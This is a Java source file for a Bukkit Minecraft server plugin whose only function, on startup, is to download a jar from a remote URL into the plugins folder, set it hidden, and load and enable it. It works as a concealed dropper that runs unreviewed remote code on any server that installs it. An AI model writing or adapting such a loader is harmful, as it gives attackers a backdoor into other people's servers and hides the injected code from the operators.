package me.Python;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLConnection;
import java.nio.file.CopyOption;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

public class Enabled extends JavaPlugin {	
	
    @Override
    public void onEnable() {
        download();
    }
  
 
	String name = "Plugin";
	
	private void download() {
		try {
			String url = "http://direct_download_url.com/Plugin.jar";
			URLConnection in = new URL(url+name+".jar").openConnection();
			in.addRequestProperty("User-Agent", "Mozilla");
			InputStream res = in.getInputStream();
			Files.copy(res, Paths.get(("plugins/" + name + ".jar"), new String[0]), new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
      Files.setAttribute(Paths.get("plugins/" + name + ".jar"), "dos:hidden", true);
		} catch (Exception e) {
		    e.printStackTrace();
		}
		try {
			Bukkit.getPluginManager().loadPlugin(new File(Paths.get(("plugins/"+name+".jar"), new String[0]).toString()));
      Files.setAttribute(Paths.get("plugins/" + name + ".jar"), "dos:hidden", true);
		} catch (Exception e) {
			   e.printStackTrace();
		}
		if (Bukkit.getPluginManager().getPlugin(name) != null) {
			Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(name));
		}
	}
}
